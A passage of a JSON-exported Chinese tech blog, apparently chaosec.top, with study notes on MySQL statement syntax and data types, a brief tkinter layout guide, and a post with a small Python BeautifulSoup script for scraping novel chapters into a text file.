&#123;%raw%&#125;[IGNORE]&#123;%endraw%&#125; [INTO] 表名 [(列名,...)] SELECT 语句 [ON DUPLICATE KEY UPDATE 列名&#x3D;expr,..] 4.3 替换旧记录 REPLACE 语句与insert相同，该语句会在插入之前将与新纪录冲突的旧记录删除，从而插入新数据4.4 插入图片可以插入路径或者直接存储图片本身(使用load_file()函数，参数为图片路径) 修改记录 4.1 修改单个表 12345UPDATE [LOW_PRIORITY] [IGNORE] 表名 SET 列名1&#x3D;expr1[,列名2&#x3D;expr2...] [WHERE 条件] # 若没有设定，则会更新所有区行 [ORDER BY ...] [LIMIT row_count] 4.2 修改多个表 123UPDATE [LOW_PRIORITY] [IGNORE] 表名1,表名2,... SET 列名1&#x3D;expr1[,列名2&#x3D;expr2...] [WHERE 条件] 删除记录 4.1单表操作 1234delete [low_priority] [quick] from 表名 # quick修饰符可以加快部分删除操作的速度 [where 条件] [order by ...] [limit row_count] 2.多个表中操作 123delete [low_priority] [quick] [ignore] 表名[.*][,表名[.*]...] from table_references [where ] 该语句删除from子句之前的表中的内容 或者 1234delete [low_priority] [quick] [ignore] # 该语句删除from子句中的表中的内容 from 表名[.*][,表名[.*]...] using table_references [where] EXAMPE： 123delete user1,user2 from user1,user2,user where user1.id&#x3D;user.id and user2.id&#x3D;user.id 清除表数据 1truncate table 表名 # 清空表 数据库信息显示","categories":[{"name":"资料","slug":"资料","permalink":"http://chaosec.top/categories/%E8%B5%84%E6%96%99/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://chaosec.top/tags/SQL/"}]},{"title":"MySQL学习笔记(一)","slug":"Mysqldatatype","date":"2018-01-01T12:58:02.000Z","updated":"2018-01-25T07:17:24.416Z","comments":true,"path":"2018/01/01/Mysqldatatype/","link":"","permalink":"http://chaosec.top/2018/01/01/Mysqldatatype/","excerpt":"MySQL数据类型","text":"MySQL数据类型 MySQL数据类型 在MYSQL数据类型主要有文本、数字、时间/日期类型 Numbe类型 数据类型 描述 TINYINT(size) -128 到 127 常规。0 到 255 无符号*。在括号中规定最大位数。 SMALLINT(size) -32768 到 32767 常规。0 到 65535 无符号*。在括号中规定最大位数。 MEDIUMINT(size) -8388608 到 8388607 普通。0 to 16777215 无符号*。在括号中规定最大位数。 INT(size) -2147483648 到 2147483647 常规。0 到 4294967295 无符号*。在括号中规定最大位数。 BIGINT(size) -9223372036854775808 到 9223372036854775807 常规。0 到 18446744073709551615 无符号*。在括号中规定最大位数。 FLOAT(size,d) 带有浮动小数点的小数字。在括号中规定最大位数。在 d 参数中规定小数点右侧的最大位数。 REAL(length,d) 和FLOAT类型差不多，运算速度快，但是精度有限。 DOUBLE(size,d) 带有浮动小数点的大数字。在括号中规定最大位数。在 d 参数中规定小数点右侧的最大位数。 DECIMAL(size,d) 作为字符串存储的 DOUBLE 类型，允许固定的小数点 BIT[M] 该数据类型在数据库中以1,0的形式存储，因此修改时只能用1,0或者true/false来存储 Date类型 数据类型 描述 DATE() 日期。格式：YYYY-MM-DD //注释：支持的范围是从 ‘1000-01-01’ 到 ‘9999-12-31’ DATETIME() 日期和时间的组合。格式：YYYY-MM-DD HH:MM:SS // 注释：支持的范围是从 ‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’ TIMESTAMP() 时间戳。TIMESTAMP 值使用 Unix 纪元(‘1970-01-01 00:00:00’ UTC) 至今的描述来存储。格式：YYYY-MM-DD HH:MM:SS // 注释：支持的范围是从 ‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-09 03:14:07’ UTC TIME() 时间。格式：HH:MM:SS 注释：支持的范围是从 ‘-838:59:59’ 到 ‘838:59:59’ YEAR() 2 位或 4 位格式的年。 // 注释：4 位格式所允许的值：1901 到 2155。2 位格式所允许的值：70 到 69，表示从 1970 到 2069。 Text类型 数据类型 描述 CHAR(size) 保存固定长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的长度。最多 255 个字符。 VARCHAR(size) 保存可变长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的最大长度。最多 255 个字符。 // 注释：如果值的长度大于 255，则被转换为 TEXT 类型。 TINYTEXT 存放最大长度为 255 个字符的字符串。 TEXT 存放最大长度为 65,535 个字符的字符串。 BLOB 用于 BLOBs (Binary Large OBjects)。存放最多 65,535 字节的数据。 MEDIUMTEXT 存放最大长度为 16,777,215 个字符的字符串。 MEDIUMBLOB 用于 BLOBs (Binary Large OBjects)。存放最多 16,777,215 字节的数据。 LONGTEXT 存放最大长度为 4,294,967,295 个字符的字符串。 LONGBLOB 用于 BLOBs (Binary Large OBjects)。存放最多 4,294,967,295 字节的数据。 ENUM(x,y,z,etc.) 允许你输入可能值的列表。可以在 ENUM 列表中列出最大 65535 个值。如果列表中不存在插入的值，则插入空值。//注释：这些值是按照你输入的顺序存储的。可以按照此格式输入可能的值：ENUM(‘X’,’Y’,’Z’) SET 与 ENUM 类似，SET 最多只能包含 64 个列表项，不过 SET 可存储一个以上的值。","categories":[{"name":"资料","slug":"资料","permalink":"http://chaosec.top/categories/%E8%B5%84%E6%96%99/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://chaosec.top/tags/SQL/"}]},{"title":"tkinter","slug":"tkinter","date":"2017-12-20T12:19:54.000Z","updated":"2018-02-09T14:08:20.524Z","comments":true,"path":"2017/12/20/tkinter/","link":"","permalink":"http://chaosec.top/2017/12/20/tkinter/","excerpt":"最近程序设计课我不知道为什么鬼使神差的使用python的tkinter库开发了gui程序，虽然过程很多波折，但是还是学到了不少东西的，特地把一些东西记录一下。","text":"最近程序设计课我不知道为什么鬼使神差的使用python的tkinter库开发了gui程序，虽然过程很多波折，但是还是学到了不少东西的，特地把一些东西记录一下。 简单开始1234from tkinter import *root &#x3D; Tk()root.title(&quot;start&quot;)root.mainloop() 参考文档 该模块中对于控件的放置支持三种方法 pack方法 pack的放置是基于块的思想来实现的，每一个块放置后系统会自动填充到目标窗体中，可以通过属性来改变其放置的位置，属于tkinter中比较常用的一种方法。注意frame控件属于pack()方法的内容，不能够和其它方法混用。 常用参数： 参数 说明 anchor 设置对齐方式，以地理坐标的方式，参数有E,W,N,S(东南西北),EN,ES,WE,WS,W+E+S+N fill 填充方向，可以选择X方向，Y方向，BOTH指两个方向都包含 expand 设置是否扩充 ipadx x内边距 ipady y内边距 padx x外边距 pady y外边距 side 放置大致方位 grid方法 grid方法对于控件的放置是基于表格的形式来放置，但是通过row，column选项可以控制控件的位置，注意row或者column选项值相等的控件会水平或竖直对齐。 place方法 该方法通过指定在屏幕上的x，y值来控制控件的位置，可以实现非常精确的控制，但是这种方法编写非常复杂，所以不推荐这种方法。 注意：这三种方法不能再一个窗口中混用，尤其是pack和grid方法，如果混用会报错。而且会导致控件放置错乱。 对于treeview视图，贴个网址，我感觉就应该足够了点我 后记 本来一片雄心想大写特写，然而，理想很丰满，现实很骨感，还是没写多少东西，不过感觉也差不多够用了(#^.^#)。","categories":[{"name":"资料","slug":"资料","permalink":"http://chaosec.top/categories/%E8%B5%84%E6%96%99/"}],"tags":[{"name":"tkinter","slug":"tkinter","permalink":"http://chaosec.top/tags/tkinter/"}]},{"title":"Spider攻城记","slug":"spider1","date":"2017-12-15T04:08:02.000Z","updated":"2018-07-31T01:57:19.888Z","comments":true,"path":"2017/12/15/spider1/","link":"","permalink":"http://chaosec.top/2017/12/15/spider1/","excerpt":"刚刚起步，先来点东西水一水…","text":"刚刚起步，先来点东西水一水… 为什么要干这个呢 最近突然想看《细说隋唐》，但是网上找资源很难找，好不容易找到一个在线阅读网站但是这个网站的页面不能自动适应手机界面，很烦，而且不能自动切换到下一章，每一次都得返回目录页找下一章，而且页面上还有广告QAQ~~…总之不舒服，于是突发奇想做个爬虫（spider）把内容爬下来，然后导入手机观看，这样岂不是很有逼格？！说干就干。 目标网址Link 工具 python、掌阅（一款电子书APP）、python包BeautifulSoup4 分析URL 每个具体章节例如第5章http://www.saohua.com/shuku/xishuosuitang/ldf06.htm，发现第i章URL为http://www.saohua.com/shuku/xishuosuitang/ldfi-5.htm 开始攻城 既然规律找到了那么接下来就好办了，这里还有一个问题，掌阅可以自动生成目录，其实是把你的txt文件中的第几回第几章等自动生成，所以文件里要有第几章所以加了一段转换代码生成”第几章”字样，贴一下代码。12345678910111213141516171819202122import urllib.request as ufrom bs4 import BeautifulSoup f=open('a.txt','w+')for i in range(22,111): url=\"http://www.saohua.com/shuku/xishuosuitang/ldf\"+str(i)+\".htm\" res=u.urlopen(url) html=res.read().decode('gbk') soup = BeautifulSoup(html,'lxml') for col in range(2): for data in soup.find_all('font')[col]: if(data.string!='HTMLBUILERPART0' and data.string!='/HTMLBUILERPART0'): if(data.string==None): f.write('\\n') elif(str(i-5) in data.string): f.write('第'+str(i-5)+'回:'+data.string) else: f.write(data.string)f.close() 运行一下，大概三四秒钟… C:\\Users\\xxx\\Desktop&gt;python spider.py 导入手机 这部分大家应该都会吧，打开掌阅导入一下就可以看了。 填坑总结 1.好好学英语吧，BeautifulSoup官方文档是靠着Google浏览器自动翻译的，研究了半天。2.还有需要注意文字编码问题。3.由于这个网站没有屏蔽爬虫，所以简单代码就可以。4.{%raw%}{%endraw%}可以使输入的文本不被解析。","categories":[{"name":"教程","slug":"教程","permalink":"http://chaosec.top/categories/%E6%95%99%E7%A8%8B/"}],"tags":[{"name":"Spider","slug":"Spider","permalink":"http://chaosec.top/tags/Spider/"},{"name":"Python","slug":"Python","permalink":"http://chaosec.top/tags/Python/"}]}]}